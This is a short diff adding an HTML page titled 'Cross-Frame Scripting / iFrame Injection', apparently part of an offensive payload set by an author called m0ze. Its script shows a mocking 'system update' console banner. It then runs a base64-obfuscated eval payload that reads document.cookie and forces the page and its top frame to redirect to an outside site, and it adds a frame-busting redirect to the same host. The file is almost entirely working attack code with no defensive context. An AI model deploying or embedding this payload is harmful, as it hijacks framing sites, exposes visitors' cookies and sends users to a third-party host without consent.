@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<!--
+	 __ __ ___ ____ ____ 
+	|  |  |   |__  |  __|
+	| | | | / |  __|  __|
+	|_|_|_|___|____|____|
+-->
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<title>m0ze@blackcore:~# Cross-Frame Scripting / iFrame Injection</title>
+		<meta name="description" content="Cross-Frame Scripting / iFrame Injection">
+		<meta name="keywords" content="XFS, iFrame, Injection">
+		<meta name="author" content="m0ze">
+	</head>
+	<body>
+		<script>
+			console.log(`%c
+ ╔═══════════════════════════════════════════════════════════════════════════╗ 
+ ║                                                                           ║ 
+ ║    ███╗   ███╗ ██████╗ ███████╗███████╗    > System update available      ║ 
+ ║    ████╗ ████║██╔═████╗╚══███╔╝██╔════╝    > Update: Y/N                  ║ 
+ ║    ██╔████╔██║██║██╔██║  ███╔╝ █████╗      > Updating, please wait...     ║ 
+ ║    ██║╚██╔╝██║████╔╝██║ ███╔╝  ██╔══╝      > System update successful!    ║ 
+ ║    ██║ ╚═╝ ██║╚██████╔╝███████╗███████╗                                   ║ 
+ ║    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚══════╝    > No problem, right?           ║ 
+ ║                                                                           ║ 
+ ╚═══════════════════════════════════════════════════════════════════════════╝ `,"color:#e61d4c; background:#000000; font-family: monospace");
+			eval(atob('amF2YXNjcmlwdDphbGVydChgbTB6ZWApO2FsZXJ0KGRvY3VtZW50LmNvb2tpZSk7dG9wLmxvY2F0aW9uPSdodHRwczovL20wemUucnUnO2xvY2F0aW9uPSdodHRwczovL20wemUucnUnOw=='));
+			if (window.location.hostname !== 'm0ze.ru'){top.location='//m0ze.ru';}
+		</script>
+	</body>
+</html>
